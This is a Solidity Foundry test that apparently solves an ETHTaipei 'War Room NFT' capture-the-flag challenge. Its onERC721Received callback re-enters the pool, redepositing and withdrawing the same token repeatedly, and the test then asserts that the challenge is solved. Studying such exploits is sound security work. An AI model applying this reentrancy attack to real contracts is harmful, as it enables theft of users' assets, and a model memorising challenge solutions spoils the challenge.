// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;
pragma experimental ABIEncoderV2;

import {Test} from "forge-std/Test.sol";
import {Pool, PoolBase} from "src/ETHTaipeiWarRoomNFT/Pool.sol";
import {WarRoomNFT} from "src/ETHTaipeiWarRoomNFT/NFT.sol";

contract PoolTest is Test {
    WarRoomNFT public nft;
    Pool public pool;
    uint256 public tokenId;
    address public challenger;
    PoolBase public base;
    uint256 cnt;

    function setUp() public {
        uint256 startTime = block.timestamp + 60;
        uint256 endTime = startTime + 60;
        uint256 fullScore = 100;
        base = new PoolBase(startTime, endTime, fullScore);
        base.setup();

        nft = base.nft();
        pool = base.pool();
        tokenId = base.tokenId();
        challenger = base.challenger();
        cnt = 0;
    }

    function testExploit() public {
        vm.startPrank(challenger);
        nft.approve(address(pool), tokenId);
        pool.deposit(tokenId);
        pool.withdraw(tokenId);
        vm.stopPrank();

        base.solve();
        assertTrue(base.isSolved());
    }

    function onERC721Received(address, address, uint256, bytes memory) external returns (bytes4) {
        if (cnt < 2) {
            cnt++;
            nft.safeTransferFrom(address(this), address(pool), tokenId);
            pool.withdraw(tokenId);
        }
        return this.onERC721Received.selector;
    }
}
